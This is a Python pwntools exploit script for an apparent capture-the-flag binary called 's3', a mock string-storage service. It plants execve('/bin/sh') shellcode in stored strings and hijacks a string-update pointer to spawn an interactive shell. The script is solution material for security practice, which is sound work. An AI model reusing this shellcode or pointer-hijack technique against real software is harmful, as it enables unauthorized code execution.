#Import Pwntools
from pwn import *

#Start the process
target = process('./s3')

#Establish the function which will create a string, and return the identifier used for it
def create_string(stype, string):
	target.sendline('c ' + str(stype) + ' ' + string)
	leak = target.recvline()
	print leak
	leak = leak.replace(" Your stored string's unique identifier is: ", "")
	leak = int(leak)
	print target.recvuntil(">")
	return leak

#Establish the function whichb will update a string, and return the indetifier used for it
def update_string(id, string):
	target.sendline('u ' + str(id) + ' ' + string)
	leak = target.recvline()
	print leak
	leak = leak.replace(" Your stored string's new unique identifier is: ", "")
	leak = int(leak)
	print target.recvuntil(">")
	return leak

#Print out the start banner
print target.recvuntil("Exit Amazon S3")
print target.recvuntil('>')

#Establish our shellcode, and create the first null terminated string which contains the shellcode
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode_addr = create_string(0, shellcode)
print "The shellcode is stored at: " + hex(shellcode_addr)

#Create second null terminated string which just takes up space
pointer_addr = create_string(0, p64(shellcode_addr))
print "The space holder string is stored at: " + hex(pointer_addr) + " " + p64(pointer_addr)

#Create the thrid null terminated string which contains a pointer to the shellcode pointer
pointer_addr = create_string(0, p64(shellcode_addr))
print "The pointer is stored at: " + hex(pointer_addr) + " " + p64(pointer_addr)

#Create the counted string, doesn't matter what it is equal to
setup_addr = create_string(1, "guyinatuxedo")
print "The setup address is " + hex(setup_addr)


execution_addr = update_string(setup_addr, p64(pointer_addr))
print "The execution address is: " + hex(execution_addr)

#Read the updated counted string, pop the shell, and drop to an interactive shell
target.sendline('r ' + str(execution_addr))
target.interactive()